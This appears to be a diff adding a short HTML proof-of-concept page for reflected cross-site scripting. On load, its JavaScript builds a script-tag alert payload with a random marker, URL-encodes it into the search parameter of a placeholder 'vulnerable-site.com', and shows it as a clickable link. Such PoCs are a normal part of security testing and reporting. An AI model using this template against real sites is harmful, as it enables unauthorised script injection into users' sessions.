@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>XSS PoC</title>
+  <script>
+    function generateRandomString(length) {
+      const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+      let result = '';
+      for (let i = 0; i < length; i++) {
+        result += chars.charAt(Math.floor(Math.random() * chars.length));
+      }
+      return result;
+    }
+
+    function encodeHex(str) {
+      return Array.from(str).map(c => '%' + c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
+    }
+
+    function buildPoC() {
+      const randomStr = generateRandomString(10);
+      const xssPayload = `<script>alert('XSS-${randomStr}')<\/script>`;
+      const encodedPayload = encodeURIComponent(xssPayload);
+      const pocUrl = `https://vulnerable-site.com/search?q=${encodedPayload}`;
+      
+      const link = document.getElementById('xss-link');
+      link.href = pocUrl;
+      link.textContent = 'Click here to trigger XSS PoC';
+    }
+
+    window.onload = buildPoC;
+  </script>
+</head>
+<body>
+  <p>PoC:</p>
+  <a id="xss-link" target="_blank">Loading PoC...</a>
+</body>
+</html>
